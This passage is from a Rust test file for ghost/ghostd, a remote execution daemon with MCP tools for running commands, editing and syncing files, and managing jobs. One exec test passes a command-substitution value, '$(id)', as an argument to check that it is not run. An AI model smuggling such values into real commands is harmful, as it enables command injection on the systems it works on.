    let refused = resolver.resolve(&target, None, false).await.unwrap_err();
    let message = format!("{refused:#}");
    assert!(message.contains("2 instances are named web"), "{message}");
    let received = received.lock().unwrap();
    assert_eq!(received.len(), 3);
    assert!(
        !received[2].contains(&web.instance_id.to_string()),
        "the cached instance was read instead of the name looked up: {received:?}"
    );
}

/// The cache has a file name of its own: an older ghost installed beside
/// this one keeps its `ghostd-targets.json`, which it reads as empty and
/// writes back in its own format, and neither file changes the other.
#[test]
fn an_older_ghost_s_cache_file_is_left_alone() {
    let home = tempfile::tempdir().unwrap();
    let old = home.path().join("ghost").join("ghostd-targets.json");
    std::fs::create_dir_all(old.parent().unwrap()).unwrap();
    let old_text = br#"{"entries":{}}"#;
    std::fs::write(&old, old_text).unwrap();
    let cache = target::cache_file_in(home.path());
    assert_ne!(cache, old);
    let resolver = Resolver::for_tests("http://127.0.0.1:9/", None, Some(cache));
    let id = ghostd_protocol::v2::HostId([1; 16]);
    assert!(resolver.store_host_id(target::LOCAL_HOST_KEY, id));
    assert_eq!(std::fs::read(&old).unwrap(), old_text);
    // The older ghost writes its file: the host ID stays.
    std::fs::write(
        &old,
        br#"{"entries":{"k":{"address":"203.0.113.7","port":22,"resolved_at":0}}}"#,
    )
    .unwrap();
    assert_eq!(resolver.host_id(target::LOCAL_HOST_KEY), Some(id));
}

/// A change of the cache waits for another ghost's lock on the file beside
/// it, so that two processes (an MCP session and an agent's `ghost x`)
/// never lose each other's host IDs.
#[test]
fn a_cache_change_waits_for_another_ghost_s_lock() {
    let directory = tempfile::tempdir().unwrap();
    let cache = directory
        .path()
        .join("cache")
        .join("ghostd-targets-v2.json");
    let resolver = Arc::new(Resolver::for_tests(
        "http://127.0.0.1:9/",
        None,
        Some(cache.clone()),
    ));
    let first = ghostd_protocol::v2::HostId([1; 16]);
    let second = ghostd_protocol::v2::HostId([2; 16]);
    assert!(resolver.store_host_id(target::LOCAL_HOST_KEY, first));
    // Another ghost holds the lock.
    let held = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(target::cache_lock_path(&cache))
        .unwrap();
    held.lock().unwrap();
    let (sender, receiver) = std::sync::mpsc::channel();
    let changing = Arc::clone(&resolver);
    let thread = std::thread::spawn(move || {
        sender
            .send(changing.store_host_id("ssh example.com port - user -", second))
            .unwrap();
    });
    assert!(
        receiver.recv_timeout(Duration::from_millis(300)).is_err(),
        "the cache changed under another ghost's lock"
    );
    held.unlock().unwrap();
    assert!(receiver.recv_timeout(Duration::from_secs(10)).unwrap());
    thread.join().unwrap();
    assert_eq!(resolver.host_id(target::LOCAL_HOST_KEY), Some(first));
    assert_eq!(
        resolver.host_id("ssh example.com port - user -"),
        Some(second)
    );
}

fn closed_port() -> u16 {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    listener.local_addr().unwrap().port()
}

/// A connection that fails looks the instance up again, though its address
/// came from the API and not from the cache, but not within a minute of the
/// last lookup.
#[tokio::test(flavor = "multi_thread")]
async fn a_failed_connection_looks_the_instance_up_again() {
    let directory = tempfile::tempdir().unwrap();
    let seed = directory.path().join("a.seed");
    keys::generate_seed(&seed).unwrap();
    let forwarded = |port: u16| {
        let mut instance = named("web", "127.0.0.1");
        instance.port_forwards = vec![PortForwardView {
            public_port: port,
            guest_port: 22,
        }];
        instance
    };
    let before = forwarded(closed_port());
    let mut moved = forwarded(closed_port());
    moved.instance_id = before.instance_id;
    let (url, received) = canned_api(vec![
        (200, serde_json::to_string(&before).unwrap()),
        (200, serde_json::to_string(&moved).unwrap()),
        (200, serde_json::to_string(&before).unwrap()),
    ])
    .await;
    let target = Target::Instance(InstanceReference::Id(before.instance_id));
    let resolver = Arc::new(Resolver::for_tests(&url, Some(seed), None));
    // A lookup older than the wait: looked up again, and the new address
    // tried.
    let pool = Pool::new("web", target.clone(), None, Arc::clone(&resolver))
        .looking_up_again_after(Duration::ZERO);
    assert!(pool.call(Request::Ping).await.is_err());
    assert_eq!(received.lock().unwrap().len(), 2, "looked up again");
    let Endpoint::Ssh { port, .. } = pool.endpoint().await.unwrap() else {
        panic!("an instance is reached over SSH");
    };
    assert_eq!(port, Some(moved.port_forwards[0].public_port));
    // Within a minute of the last lookup, a failure does not ask again.
    let pool = Pool::new("web", target, None, resolver);
    assert!(pool.call(Request::Ping).await.is_err());
    assert!(pool.call(Request::Ping).await.is_err());
    assert_eq!(received.lock().unwrap().len(), 3);
}

/// A ghostd of its own for a test: `GHOSTD_BIN` with its state and socket
/// in a temporary directory; stopped at the end.
pub(crate) struct Daemon {
    directory: tempfile::TempDir,
    program: PathBuf,
}

impl Daemon {
    pub(crate) fn start() -> Self {
        let program = std::env::var_os("GHOSTD_BIN")
            .map(PathBuf::from)
            .expect("these tests need GHOSTD_BIN, the ghostd binary to test against");
        Self::of(program)
    }

    /// A daemon of `program`.
    pub(crate) fn of(program: PathBuf) -> Self {
        // A short path: the socket's must fit in sun_path.
        let directory = tempfile::Builder::new()
            .prefix("gh")
            .tempdir_in("/tmp")
            .unwrap();
        Self { directory, program }
    }

    pub(crate) fn env(&self) -> Vec<(OsString, OsString)> {
        vec![
            (
                "GHOSTD_STATE_DIR".into(),
                self.directory.path().join("s").into_os_string(),
            ),
            (
                "GHOSTD_RUNTIME_DIR".into(),
                self.directory.path().join("r").into_os_string(),
            ),
            (
                "GHOSTD_CONFIG".into(),
                self.directory.path().join("config.toml").into_os_string(),
            ),
        ]
    }

    pub(crate) fn endpoint(&self) -> Endpoint {
        Endpoint::Local {
            program: self.program.clone(),
            env: self.env(),
        }
    }

    pub(crate) fn pool(&self) -> Pool {
        Pool::for_endpoint("local", self.endpoint())
    }

    pub(crate) fn path(&self, name: &str) -> PathBuf {
        self.directory.path().join(name)
    }

    /// Stops the daemon and removes its state, as a reinstalled machine's:
    /// the next connection starts one with a new host ID.
    pub(crate) fn wipe(&self) {
        let _ = std::process::Command::new(&self.program)
            .arg("stop")
            .envs(self.env())
            .output();
        std::fs::remove_dir_all(self.directory.path().join("s")).unwrap();
    }

    /// The daemon's host ID, asked on a connection of its own.
    pub(crate) async fn host_id(&self) -> ghostd_protocol::v2::HostId {
        match self
            .pool()
            .call2(ghostd_protocol::v2::Request::Identify)
            .await
            .unwrap()
        {
            ghostd_protocol::v2::Response::Identity(identity) => identity.host_id,
            other => panic!("Identify answered {other:?}"),
        }
    }
}

impl Drop for Daemon {
    fn drop(&mut self) {
        let _ = std::process::Command::new(&self.program)
            .arg("stop")
            .envs(self.env())
            .output();
    }
}

fn argv(args: &[&str]) -> Program {
    Program::Argv(args.iter().map(|arg| arg.as_bytes().to_vec()).collect())
}

fn write_random(path: &Path, size: usize) {
    let mut data = vec![0u8; size];
    let mut state = 0x9e37_79b9_7f4a_7c15_u64;
    for chunk in data.chunks_mut(8) {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        let bytes = state.to_le_bytes();
        chunk.copy_from_slice(&bytes[..chunk.len()]);
    }
    std::fs::write(path, data).unwrap();
}

fn kill(pid: u32) {
    let killed = std::process::Command::new("kill")
        .args(["-9", &pid.to_string()])
        .status()
        .unwrap();
    assert!(killed.success());
}

/// A short exec is answered while a 50 MiB upload runs on a connection of
/// its own.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_pool_answers_short_calls_during_a_bulk_upload() {
    let daemon = Daemon::start();
    let pool = Arc::new(daemon.pool());
    let local = daemon.path("big");
    write_random(&local, 50 * 1024 * 1024);
    let remote = daemon.path("big.copy");
    // The short connection first, so the exec below needs no new one.
    pool.call(Request::Ping).await.unwrap();
    let uploaded = Arc::new(AtomicBool::new(false));
    let upload = tokio::spawn({
        let pool = Arc::clone(&pool);
        let uploaded = Arc::clone(&uploaded);
        let local = local.clone();
        let remote = ops::bytes(remote.to_str().unwrap());
        async move {
            let sent = ops::upload(&pool, None, &local, &remote, None, false).await;
            uploaded.store(true, Ordering::SeqCst);
            sent
        }
    });
    tokio::time::sleep(Duration::from_millis(100)).await;
    let result = ops::exec(
        &pool,
        ExecSpec {
            program: argv(&["echo", "short"]),
            ..ExecSpec::default()
        },
    )
    .await
    .unwrap();
    assert!(
        !uploaded.load(Ordering::SeqCst),
        "the short call waited for the upload"
    );
    assert_eq!(result.stdout.data, b"short\n");
    let sent = upload.await.unwrap().unwrap();
    assert_eq!(sent.size, 50 * 1024 * 1024);
    assert_eq!(sent.sha256, ops::local_sha256(&local).unwrap().1);
    assert_eq!(
        std::fs::read(&remote).unwrap(),
        std::fs::read(&local).unwrap()
    );
    // The short connection and the bulk one, kept for reuse.
    assert_eq!(pool.connections(), 2);
}

/// Every connection busy with a bulk transfer: a short call waits for one
/// and never blocks them.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_pool_short_call_waits_for_a_busy_cap() {
    let daemon = Daemon::start();
    let pool = Arc::new(daemon.pool());
    let mut held = Vec::new();
    for _ in 0..MAX_CONNECTIONS {
        held.push(pool.bulk().await.unwrap());
    }
    let short = tokio::spawn({
        let pool = Arc::clone(&pool);
        async move { pool.call(Request::Ping).await }
    });
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(!short.is_finished(), "a short call went past the cap");
    // The bulk connections still work.
    for bulk in &held {
        bulk.call(Request::Ping).await.unwrap();
    }
    drop(held);
    tokio::time::timeout(Duration::from_secs(10), short)
        .await
        .unwrap()
        .unwrap()
        .unwrap();
    assert_eq!(pool.connections(), MAX_CONNECTIONS);
}

/// The connection dies during an exec: the pool sends the same request
/// with the same job ID again, which takes the running job up; the program
/// runs once.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_exec_retry_after_a_lost_connection_runs_once() {
    let daemon = Daemon::start();
    let pool = Arc::new(daemon.pool());
    let marker = daemon.path("runs");
    let pid = pool.short().await.unwrap().pid().unwrap();
    let job_id = fresh_job_id();
    let exec = tokio::spawn({
        let pool = Arc::clone(&pool);
        let script = format!("echo run >> '{}'; sleep 2; echo done", marker.display());
        let job_id = job_id.clone();
        async move {
            ops::exec(
                &pool,
                ExecSpec {
                    program: argv(&["sh", "-c", &script]),
                    job_id: Some(job_id),
                    ..ExecSpec::default()
                },
            )
            .await
        }
    });
    tokio::time::sleep(Duration::from_millis(700)).await;
    kill(pid);
    let result = tokio::time::timeout(Duration::from_secs(20), exec)
        .await
        .unwrap()
        .unwrap()
        .unwrap();
    assert_eq!(result.job_id, job_id);
    assert_eq!(result.outcome, Outcome::Exited { code: 0 });
    assert_eq!(result.stdout.data, b"done\n");
    assert_eq!(std::fs::read_to_string(&marker).unwrap(), "run\n");
    // A new connection replaced the dead one.
    assert_ne!(pool.short().await.unwrap().pid(), Some(pid));
}

/// A connection that died while idle is replaced before the next call.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_dead_idle_connection_is_replaced() {
    let daemon = Daemon::start();
    let pool = daemon.pool();
    let pid = pool.short().await.unwrap().pid().unwrap();
    kill(pid);
    tokio::time::sleep(Duration::from_millis(300)).await;
    let file = daemon.path("f");
    std::fs::write(&file, "a").unwrap();
    let edited = pool
        .call(Request::FileEdit {
            path: ops::bytes(file.to_str().unwrap()),
            old: b"a".to_vec(),
            new: b"b".to_vec(),
            replace_all: false,
        })
        .await;
    assert!(edited.is_ok(), "{edited:?}");
    assert_eq!(std::fs::read_to_string(&file).unwrap(), "b");
}

/// An MCP session over an in-memory pipe, with raw JSON-RPC lines.
struct Session {
    writer: tokio::io::WriteHalf<tokio::io::DuplexStream>,
    reader: tokio::io::Lines<BufReader<tokio::io::ReadHalf<tokio::io::DuplexStream>>>,
    next_id: u64,
}

impl Session {
    async fn start(server: GhostServer) -> Self {
        use rmcp::ServiceExt as _;
        let (client, server_side) = tokio::io::duplex(1 << 20);
        tokio::spawn(async move {
            let (read, write) = tokio::io::split(server_side);
            let service = server.serve((read, write)).await.unwrap();
            let _ = service.waiting().await;
        });
        let (read, write) = tokio::io::split(client);
        let mut session = Self {
            writer: write,
            reader: BufReader::new(read).lines(),
            next_id: 1,
        };
        let initialized = session
            .request(
                "initialize",
                json!({
                    "protocolVersion": "2025-06-18",
                    "capabilities": {},
                    "clientInfo": {"name": "test", "version": "1"}
                }),
            )
            .await;
        assert_eq!(
            initialized["result"]["serverInfo"]["name"], "ghost",
            "{initialized}"
        );
        session
            .send(&json!({"jsonrpc": "2.0", "method": "notifications/initialized"}))
            .await;
        session
    }

    async fn send(&mut self, message: &Value) {
        let mut line = serde_json::to_vec(message).unwrap();
        line.push(b'\n');
        self.writer.write_all(&line).await.unwrap();
        self.writer.flush().await.unwrap();
    }

    async fn request(&mut self, method: &str, params: Value) -> Value {
        let id = self.next_id;
        self.next_id += 1;
        self.send(&json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}))
            .await;
        loop {
            let line = tokio::time::timeout(Duration::from_mins(1), self.reader.next_line())
                .await
                .expect("an answer within a minute")
                .unwrap()
                .expect("the session goes on");
            let message: Value = serde_json::from_str(&line).unwrap();
            if message["id"] == json!(id) {
                return message;
            }
        }
    }

    /// A tool call's structured content; panics with its text when it
    /// failed.
    async fn call(&mut self, tool: &str, arguments: Value) -> Value {
        let result = self.call_raw(tool, arguments).await;
        assert_ne!(result["isError"], true, "{tool} failed: {result}");
        assert!(result["content"][0]["text"].is_string());
        result["structuredContent"].clone()
    }

    async fn call_raw(&mut self, tool: &str, arguments: Value) -> Value {
        let answer = self
            .request("tools/call", json!({"name": tool, "arguments": arguments}))
            .await;
        assert!(answer["error"].is_null(), "a protocol error: {answer}");
        answer["result"].clone()
    }
}

fn mcp_server(daemon: &Daemon, cwd: &Path) -> GhostServer {
    GhostServer::new(Arc::new(Resolver::offline()), cwd.to_path_buf())
        .with_pool("local", daemon.pool())
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_mcp_lists_its_tools_with_schemas() {
    let daemon = Daemon::start();
    let mut session = Session::start(mcp_server(&daemon, daemon.directory.path())).await;
    let listed = session.request("tools/list", json!({})).await;
    let tools = listed["result"]["tools"].as_array().unwrap();
    let mut names: Vec<&str> = tools
        .iter()
        .map(|tool| tool["name"].as_str().unwrap())
        .collect();
    names.sort_unstable();
    assert_eq!(
        names,
        [
            "ghostd_exec",
            "ghostd_file_edit",
            "ghostd_file_list",
            "ghostd_file_mkdir",
            "ghostd_file_read",
            "ghostd_file_remove",
            "ghostd_file_rename",
            "ghostd_file_search",
            "ghostd_file_stat",
            "ghostd_file_write",
            "ghostd_install",
            "ghostd_job_list",
            "ghostd_job_logs",
            "ghostd_job_remove",
            "ghostd_job_signal",
            "ghostd_job_start",
            "ghostd_job_status",
            "ghostd_job_stop",
            "ghostd_job_wait",
            "ghostd_machine_state",
            "ghostd_session_close",
            "ghostd_session_list",
            "ghostd_session_log",
            "ghostd_session_read",
            "ghostd_session_resize",
            "ghostd_session_send",
            "ghostd_session_signal",
            "ghostd_session_start",
            "ghostd_status",
            "ghostd_sync",
            "ghostd_wait",
        ]
    );
    for tool in tools {
        let name = &tool["name"];
        assert_eq!(tool["inputSchema"]["type"], "object", "{name}");
        assert!(
            tool["inputSchema"]["properties"]["target"].is_object(),
            "{name} takes no target: {tool}"
        );
        assert!(
            tool["inputSchema"]["required"]
                .as_array()
                .is_some_and(|required| required.contains(&json!("target"))),
            "{name}'s target is optional"
        );
        assert_eq!(
            tool["inputSchema"]["properties"]["refresh"]["type"], "boolean",
            "{name} takes no refresh: {tool}"
        );
        let output = &tool["outputSchema"]["properties"];
        if name != "ghostd_status" {
            assert!(
                output["host_check"].is_object() && output["notice"].is_object(),
                "{name}'s result does not say whether the host was checked: {tool}"
            );
        }
        assert_eq!(tool["outputSchema"]["type"], "object", "{name}");
        assert!(
            tool["description"]
                .as_str()
                .is_some_and(|text| text.len() > 20)
        );
    }
    let exec = tools
        .iter()
        .find(|tool| tool["name"] == "ghostd_exec")
        .unwrap();
    let properties = &exec["inputSchema"]["properties"];
    for field in [
        "argv",
        "script",
        "script_file",
        "stdin",
        "env",
        "cwd",
        "timeout_seconds",
        "output_file",
    ] {
        assert!(properties[field].is_object(), "ghostd_exec lacks {field}");
    }
    assert!(
        exec["description"]
            .as_str()
            .unwrap()
            .contains("ghostd_job_start")
    );
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_mcp_runs_programs_and_jobs() {
    let daemon = Daemon::start();
    let cwd = daemon.directory.path().to_path_buf();
    let mut session = Session::start(mcp_server(&daemon, &cwd)).await;
    let raw = session
        .call_raw(
            "ghostd_exec",
            json!({"target": "local", "argv": ["printf", "%s|", "a b", "'c'", "$(id)"]}),
        )
        .await;
    // The text block holds the summary and then the whole result as JSON,
    // for clients that pass only the text to the model.
    let text = raw["content"][0]["text"].as_str().unwrap();
    let (summary, json_text) = text.split_once('\n').unwrap();
    assert!(summary.starts_with("exited with 0"), "{summary}");
    assert_eq!(
        serde_json::from_str::<Value>(json_text).unwrap(),
        raw["structuredContent"]
    );
    let ran = raw["structuredContent"].clone();
    assert_eq!(ran["stdout"], "a b|'c'|$(id)|");
    assert_eq!(ran["exit_code"], 0);
    assert_eq!(ran["stdout_valid_utf8"], true);
    let ran = session
        .call(
            "ghostd_exec",
            json!({"target": "local", "script": "echo \"$1\" >&2; exit 4", "args": ["x y"], "stdin": "ignored"}),
        )
        .await;
    assert_eq!(ran["exit_code"], 4);
    assert_eq!(ran["stderr"], "x y\n");
    // All of a large stdout reaches output_file; the result holds its tail.
    let ran = session
        .call(
            "ghostd_exec",
            json!({"target": "local", "argv": ["seq", "1", "100000"], "output_file": "seq.txt"}),
        )
        .await;
    let expected = (1..=100_000).fold(String::new(), |mut text, n| {
        use std::fmt::Write as _;
        let _ = writeln!(text, "{n}");
        text
    });
    assert_eq!(
        std::fs::read_to_string(cwd.join("seq.txt")).unwrap(),
        expected
    );
    assert_eq!(ran["stdout_total"], expected.len());
    assert!(ran["stdout_offset"].as_u64().unwrap() > 0);
    assert!(expected.ends_with(ran["stdout"].as_str().unwrap()));
    // The rest of stdout through the job's log.
    let logs = session
        .call(
            "ghostd_job_logs",
            json!({"target": "local", "job_id": ran["job_id"], "offset": 0, "max_bytes": 10}),
        )
        .await;
    assert_eq!(logs["text"], "1\n2\n3\n4\n5\n");
    assert_eq!(logs["next_offset"], 10);
    assert_eq!(logs["truncated"], true);
    // A job: started, waited for, stopped.
    let started = session
        .call(
            "ghostd_job_start",
            json!({"target": "local", "argv": ["sleep", "30"], "name": "sleeper"}),
        )
        .await;
    let job_id = started["job_id"].as_str().unwrap().to_owned();
    let waited = session
        .call(
            "ghostd_job_wait",
            json!({"target": "local", "job_id": job_id, "timeout_seconds": 1}),
        )
        .await;
    assert_eq!(waited["finished"], false);
    assert_eq!(waited["state"], "running");
    let listed = session
        .call("ghostd_job_list", json!({"target": "local"}))
        .await;
    assert!(
        listed["jobs"]
            .as_array()
            .unwrap()
            .iter()
            .any(|job| job["job_id"] == job_id.as_str())
    );
    let stopped = session
        .call(
            "ghostd_job_stop",
            json!({"target": "local", "job_id": job_id}),
        )
        .await;
    assert_eq!(stopped["finished"], true);
    session
        .call(
            "ghostd_job_remove",
            json!({"target": "local", "job_id": job_id}),
        )
        .await;
    let status = session
        .call("ghostd_status", json!({"target": "local"}))
        .await;
    assert_eq!(status["protocol_version"], 2);
    assert_eq!(status["host_check"], true);
    assert_eq!(status["host_id"].as_str().map(str::len), Some(32));
    // A failure is a tool error with ghostd's words, not a protocol error.
    let failed = session
        .call_raw(
            "ghostd_job_status",
            json!({"target": "local", "job_id": job_id}),
        )
        .await;
    assert_eq!(failed["isError"], true);
    assert!(
        failed["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("NotFound"),
        "{failed}"
    );
    let failed = session
        .call_raw(
            "ghostd_exec",
            json!({"target": "nowhere at all", "argv": ["true"]}),
        )
        .await;
    assert_eq!(failed["isError"], true);
    let failed = session
        .call_raw("ghostd_exec", json!({"target": "local"}))
        .await;
    assert_eq!(failed["isError"], true);
    assert!(
        failed["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("exactly one of argv")
    );
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_mcp_works_on_files() {
    let daemon = Daemon::start();
    let cwd = daemon.directory.path().to_path_buf();
    let remote = cwd.join("remote");
    let remote_text = remote.to_str().unwrap().to_owned();
    let file = format!("{remote_text}/dir/notes.txt");
    let mut session = Session::start(mcp_server(&daemon, &cwd)).await;
    let written = session
        .call(
            "ghostd_file_write",
            json!({"target": "local", "path": file, "content": "one\ntwo\n", "create_dirs": true, "mode": "600"}),
        )
        .await;
    assert_eq!(written["size"], 8);
    let edited = session
        .call(
            "ghostd_file_edit",
            json!({"target": "local", "path": file, "old": "two", "new": "three"}),
        )
        .await;
    assert_eq!(edited["replacements"], 1);
    let read = session
        .call("ghostd_file_read", json!({"target": "local", "path": file}))
        .await;
    assert_eq!(read["text"], "one\nthree\n");
    assert_eq!(read["eof"], true);
    let stat = session
        .call("ghostd_file_stat", json!({"target": "local", "path": file}))
        .await;
    assert_eq!(stat["kind"], "file");
    assert_eq!(stat["mode"], "600");
    let listed = session
        .call(
            "ghostd_file_list",
            json!({"target": "local", "path": remote_text, "depth": 3}),
        )
        .await;
    let paths: Vec<&str> = listed["entries"]
        .as_array()
        .unwrap()
        .iter()
        .map(|entry| entry["path"].as_str().unwrap())
        .collect();
    assert_eq!(paths, ["dir", "dir/notes.txt"]);
    let found = session
        .call(
            "ghostd_file_search",
            json!({"target": "local", "pattern": "^thr", "path": remote_text}),
        )
        .await;
    assert_eq!(found["matches"][0]["path"], "dir/notes.txt");
    assert_eq!(found["matches"][0]["line_number"], 2);
    // A 5 MiB file up from from_path and down to to_path, unchanged.
    write_random(&cwd.join("five"), 5 * 1024 * 1024);
    let big = format!("{remote_text}/five");
    let up = session
        .call(
            "ghostd_file_write",
            json!({"target": "local", "path": big, "from_path": "five"}),
        )
        .await;
    let digest = ops::hex(&ops::local_sha256(&cwd.join("five")).unwrap().1);
    assert_eq!(up["sha256"], digest.as_str());
    let down = session
        .call(
            "ghostd_file_read",
            json!({"target": "local", "path": big, "to_path": "five.back"}),
        )
        .await;
    assert_eq!(down["sha256"], digest.as_str());
    assert_eq!(
        std::fs::read(cwd.join("five.back")).unwrap(),
        std::fs::read(cwd.join("five")).unwrap()
    );
    session
        .call(
            "ghostd_file_rename",
            json!({"target": "local", "from": big, "to": format!("{big}.old")}),
        )
        .await;
    session
        .call(
            "ghostd_file_mkdir",
            json!({"target": "local", "path": format!("{remote_text}/a/b")}),
        )
        .await;
    session
        .call(
            "ghostd_file_remove",
            json!({"target": "local", "path": format!("{remote_text}/a"), "recursive": true}),
        )
        .await;
    assert!(!remote.join("a").exists());
    let failed = session
        .call_raw(
            "ghostd_file_edit",
            json!({"target": "local", "path": file, "old": "absent", "new": "x"}),
        )
        .await;
    assert_eq!(failed["isError"], true);
}

#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_mcp_syncs_both_ways() {
    let daemon = Daemon::start();
    let cwd = daemon.directory.path().to_path_buf();
    let source = cwd.join("src");
    std::fs::create_dir_all(source.join("sub/deeper")).unwrap();
    std::fs::write(source.join("a.txt"), "a").unwrap();
    std::fs::write(source.join("sub/b.txt"), "bb").unwrap();
    write_random(&source.join("sub/deeper/big"), 3 * 1024 * 1024);
    let remote = cwd.join("remote-tree");
    let remote_text = remote.to_str().unwrap();
    let mut session = Session::start(mcp_server(&daemon, &cwd)).await;
    let up = json!({"target": "local", "direction": "up", "local_dir": "src", "remote_dir": remote_text});
    let first = session.call("ghostd_sync", up.clone()).await;
    assert_eq!(first["files"], 3);
    assert_eq!(first["copied"], 3);
    assert_eq!(
        std::fs::read(remote.join("sub/deeper/big")).unwrap(),
        std::fs::read(source.join("sub/deeper/big")).unwrap()
    );
    // Only what changed goes the second time.
    std::fs::write(source.join("a.txt"), "A").unwrap();
    let second = session.call("ghostd_sync", up.clone()).await;
    assert_eq!(second["copied"], 1);
    assert_eq!(second["unchanged"], 2);
    assert_eq!(std::fs::read_to_string(remote.join("a.txt")).unwrap(), "A");
    // Down into an empty directory, then again with nothing to copy.
    let down = json!({"target": "local", "direction": "down", "local_dir": "back", "remote_dir": remote_text});
    let first = session.call("ghostd_sync", down.clone()).await;
    assert_eq!(first["copied"], 3);
    assert_eq!(
        std::fs::read(cwd.join("back/sub/deeper/big")).unwrap(),
        std::fs::read(source.join("sub/deeper/big")).unwrap()
    );
    let second = session.call("ghostd_sync", down).await;
    assert_eq!(second["copied"], 0);
    assert_eq!(second["unchanged"], 3);
    // delete removes what the source lacks.
    std::fs::remove_file(source.join("sub/b.txt")).unwrap();
    let mut deleting = up;
    deleting["delete"] = json!(true);
    let pruned = session.call("ghostd_sync", deleting).await;
    assert_eq!(pruned["deleted"], 1);
    assert!(!remote.join("sub/b.txt").exists());
}

/// A sync lists the whole remote tree: below the depth one listing reaches,
/// and not a directory ghostd cannot read as if it were empty; a sync down
/// with delete removes only what the target says it does not have.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_sync_sees_deep_and_unreadable_directories() {
    use std::os::unix::fs::PermissionsExt as _;
    let daemon = Daemon::start();
    let cwd = daemon.directory.path().to_path_buf();
    let remote = cwd.join("remote");
    let local = cwd.join("local");
    // 17 directories deep: one listing goes 16.
    let deep: PathBuf = std::iter::repeat_n("d", 17).collect();
    for root in [&remote, &local] {
        std::fs::create_dir_all(root.join(&deep)).unwrap();
        std::fs::write(root.join(&deep).join("f"), "deep").unwrap();
        std::fs::write(root.join("top"), "top").unwrap();
    }
    std::fs::write(remote.join(&deep).join("g"), "only on the target").unwrap();
    let mut session = Session::start(mcp_server(&daemon, &cwd)).await;
    let down = json!({
        "target": "local",
        "direction": "down",
        "local_dir": "local",
        "remote_dir": remote.to_str().unwrap(),
        "delete": true,
    });
    let report = session.call("ghostd_sync", down.clone()).await;
    assert_eq!(report["files"], 3, "{report}");
    assert_eq!(report["unchanged"], 2);
    assert_eq!(report["copied"], 1);
    assert_eq!(report["deleted"], 0);
    assert_eq!(
        std::fs::read_to_string(local.join(&deep).join("f")).unwrap(),
        "deep"
    );
    assert_eq!(
        std::fs::read_to_string(local.join(&deep).join("g")).unwrap(),
        "only on the target"
    );
    // A sync down never writes through a local symlink.
    let elsewhere = cwd.join("elsewhere");
    std::fs::create_dir(&elsewhere).unwrap();
    std::fs::create_dir(remote.join("link")).unwrap();
    std::fs::write(remote.join("link").join("x"), "x").unwrap();
    std::os::unix::fs::symlink(&elsewhere, local.join("link")).unwrap();
    let report = session.call("ghostd_sync", down.clone()).await;
    assert_eq!(report["skipped"], 1, "{report}");
    assert_eq!(report["copied"], 0);
    assert!(!elsewhere.join("x").exists());
    std::fs::remove_dir_all(remote.join("link")).unwrap();
    std::fs::remove_file(local.join("link")).unwrap();
    if rustix::process::geteuid().is_root() {
        // Root reads whatever the modes say.
        return;
    }
    // A directory ghostd cannot read stops the sync, with or without
    // delete, and the local copy stays.
    let locked = remote.join("locked");
    std::fs::create_dir(&locked).unwrap();
    std::fs::write(locked.join("f"), "f").unwrap();
    std::fs::create_dir(local.join("locked")).unwrap();
    std::fs::write(local.join("locked").join("f"), "f").unwrap();
    std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o000)).unwrap();
    let with_delete = session.call_raw("ghostd_sync", down.clone()).await;
    let mut keeping = down.clone();
    keeping["delete"] = json!(false);
    let without_delete = session.call_raw("ghostd_sync", keeping).await;
    // Readable but not searchable: ghostd cannot read its entries and says
    // the listing is truncated, which stops the sync.
    std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o444)).unwrap();
    let unsearchable = session.call_raw("ghostd_sync", down).await;
    std::fs::set_permissions(&locked, std::fs::Permissions::from_mode(0o755)).unwrap();
    for failed in [&with_delete, &without_delete, &unsearchable] {
        assert_eq!(failed["isError"], true, "{failed}");
    }
    assert!(
        with_delete["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("cannot list"),
        "{with_delete}"
    );
    // ghostd says such a listing is truncated: the side is incomplete.
    assert!(
        unsearchable["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("is incomplete"),
        "{unsearchable}"
    );
    assert!(local.join("locked").join("f").exists());
}

/// After an install, the check opens a new connection and says when the
/// daemon that answers is not the binary just installed.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_install_check_names_a_daemon_that_runs_the_old_binary() {
    let daemon = Daemon::start();
    let pool = daemon.pool();
    let before = pool.short().await.unwrap();
    let version = before.server_version().to_owned();
    let notes = install::InstallNotes {
        version: Some(version.clone()),
        ..install::InstallNotes::default()
    };
    let installed = install::check(&pool, &notes, "source", None, Instant::now())
        .await
        .unwrap();
    assert_eq!(installed.ghostd_version, version);
    assert!(!installed.restart_needed);
    assert_eq!(installed.note, None);
    assert_ne!(
        pool.short().await.unwrap().pid(),
        before.pid(),
        "the check asked on a new connection"
    );
    let mut notes = install::InstallNotes::default();
    notes.observe("ghostd install: a ghostd daemon runs: the new binary takes effect after `ghostd stop` (the next `ghostd stdio` starts it again)");
    let installed = install::check(&pool, &notes, "source", None, Instant::now())
        .await
        .unwrap();
    assert!(installed.restart_needed);
    assert!(installed.note.unwrap().contains("ghostd stop"));
    // Another version than the one built answering says so too.
    let notes = install::InstallNotes {
        version: Some(format!("{version}-other")),
        ..install::InstallNotes::default()
    };
    let installed = install::check(&pool, &notes, "source", None, Instant::now())
        .await
        .unwrap();
